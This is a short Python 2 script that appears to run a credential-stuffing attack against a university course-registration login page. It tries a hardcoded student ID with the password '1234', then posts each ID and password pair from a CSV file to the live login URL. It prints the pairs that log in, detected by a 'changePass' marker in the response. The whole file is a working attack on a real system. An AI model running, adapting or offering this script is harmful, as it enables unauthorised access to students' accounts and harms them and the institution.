import csv

import requests
import pandas as pd

id = '14150679'
passwd = '1234'


def post(id, passwd):
    url = 'http://dangkyhoc.mta.edu.vn/dkmh/login.asp?chkSubmit=ok&txtLoginId={}&txtPassword={}&txtSel=1'.format(id,
                                                                                                                 passwd)
    headers = {
        'Content-type': 'text/html',
    }
    r = requests.post(url, headers=headers)
    if 'changePass' in r.content:
        print "{}-{}".format(id, passwd)

post(id, passwd)


with open('data_short.csv', 'rb') as csvfile:
    reader = csv.reader(csvfile, delimiter=',', quotechar='|')
    for row in reader:
        id = row[0]
        passwd = row[1]
        post(id, passwd)
